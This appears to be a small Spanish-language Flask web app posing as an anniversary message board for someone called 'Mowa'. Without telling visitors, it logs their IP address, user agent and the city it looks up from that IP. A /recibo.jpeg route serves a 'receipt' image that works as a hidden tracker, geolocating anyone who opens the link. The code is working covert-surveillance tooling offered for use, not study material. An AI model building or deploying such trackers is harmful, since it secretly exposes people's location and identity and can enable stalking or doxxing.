from flask import Flask, request, send_file
import datetime
import requests

app = Flask(__name__)

def obtener_ciudad_por_ip(ip):
    try:
        respuesta = requests.get(f'https://ipinfo.io/{ip}/json')
        if respuesta.status_code == 200:
            data = respuesta.json()
            return data.get('city', 'Ciudad desconocida')
        else:
            return 'Error en consulta IP'
    except Exception as e:
        return f'Error: {e}'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        forwarded = request.headers.get('X-Forwarded-For', '')
        ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
        ua = request.headers.get('User-Agent')
        msg = request.form.get('mensaje', '').strip()
        now = datetime.datetime.now().isoformat()

        ciudad = obtener_ciudad_por_ip(ip)

        print(f"{now} - IP: {ip} - Ciudad: {ciudad} - MENSAJE: {msg} - UA: {ua}")

        return "<h2>✅ Gracias, tu mensaje ha sido enviado.</h2>"

    return """
        <h2>💬 Deja un mensaje para Mowa en su ANIVERSARIO</h2>
        <form method="POST">
            <textarea name="mensaje" rows="4" cols="40" placeholder="Escribe aquí..." required></textarea><br><br>
            <button type="submit">Enviar</button>
        </form>
    """

@app.route('/recibo.jpeg')
def tracker():
    forwarded = request.headers.get('X-Forwarded-For', '')
    ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
    ua = request.headers.get('User-Agent')
    now = datetime.datetime.now().isoformat()

    ciudad = obtener_ciudad_por_ip(ip)

    print(f"{now} - IP: {ip} - Ciudad: {ciudad} - UA: {ua}")
    return send_file("recibo.jpeg", mimetype="image/jpeg")
